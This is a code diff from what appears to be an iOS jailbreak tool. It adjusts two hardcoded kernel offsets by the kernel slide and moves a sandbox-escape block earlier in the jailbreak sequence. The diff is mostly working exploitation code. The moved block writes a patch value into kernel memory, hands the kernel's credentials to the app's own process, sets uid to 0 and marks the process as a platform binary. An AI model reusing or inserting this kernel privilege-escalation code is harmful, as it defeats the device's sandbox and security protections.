@@ -840,8 +840,8 @@ void jailbreak()
         // Find offsets.
         
         LOG("Finding offsets...");
-        SETOFFSET(shenanigans, 0xFFFFFFF008903CE0);
-        SETOFFSET(kernel_task, 0xFFFFFFF008872200);
+        SETOFFSET(shenanigans, 0xFFFFFFF008903CE0 + kernel_slide);
+        SETOFFSET(kernel_task, 0xFFFFFFF008872200 + kernel_slide);
 /*#define PF(x) do { \
         SETMESSAGE(NSLocalizedString(@"Failed to find " #x " offset.", nil)); \
         SETOFFSET(x, find_ ##x()); \
@@ -882,6 +882,32 @@ void jailbreak()
         term_kernel();
         LOG("Successfully deinitialized patchfinder64.");
     } */
+    
+    UPSTAGE();
+    {
+        // Escape Sandbox.
+        static uint64_t ShenanigansPatch = 0xca13feba37be;
+        
+        LOG("Escaping Sandbox...");
+        SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
+        myProcAddr = get_proc_struct_for_pid(myPid);
+        LOG("myProcAddr = " ADDR, myProcAddr);
+        _assert(ISADDR(myProcAddr), message, true);
+        kernelCredAddr = get_kernel_cred_addr();
+        LOG("kernelCredAddr = " ADDR, kernelCredAddr);
+        _assert(ISADDR(kernelCredAddr), message, true);
+        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
+        LOG("Shenanigans = " ADDR, Shenanigans);
+        _assert(ISADDR(Shenanigans), message, true);
+        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
+        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, kernelCredAddr);
+        LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
+        _assert(ISADDR(myOriginalCredAddr), message, true);
+        _assert(setuid(0) == ERR_SUCCESS, message, true);
+        _assert(getuid() == 0, message, true);
+        set_platform_binary(myProcAddr);
+        LOG("Successfully escaped Sandbox.");
+    }
     
     UPSTAGE();
     
@@ -935,32 +961,6 @@ void jailbreak()
             
             INSERTSTATUS(NSLocalizedString(@"Overwrote boot nonce.\n", nil));
         }
-    }
-    
-    UPSTAGE();
-    {
-        // Escape Sandbox.
-        static uint64_t ShenanigansPatch = 0xca13feba37be;
-        
-        LOG("Escaping Sandbox...");
-        SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
-        myProcAddr = get_proc_struct_for_pid(myPid);
-        LOG("myProcAddr = " ADDR, myProcAddr);
-        _assert(ISADDR(myProcAddr), message, true);
-        kernelCredAddr = get_kernel_cred_addr();
-        LOG("kernelCredAddr = " ADDR, kernelCredAddr);
-        _assert(ISADDR(kernelCredAddr), message, true);
-        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
-        LOG("Shenanigans = " ADDR, Shenanigans);
-        _assert(ISADDR(Shenanigans), message, true);
-        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
-        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, kernelCredAddr);
-        LOG("myOriginalCredAddr = " ADDR, myOriginalCredAddr);
-        _assert(ISADDR(myOriginalCredAddr), message, true);
-        _assert(setuid(0) == ERR_SUCCESS, message, true);
-        _assert(getuid() == 0, message, true);
-        set_platform_binary(myProcAddr);
-        LOG("Successfully escaped Sandbox.");
     }
     
     UPSTAGE();
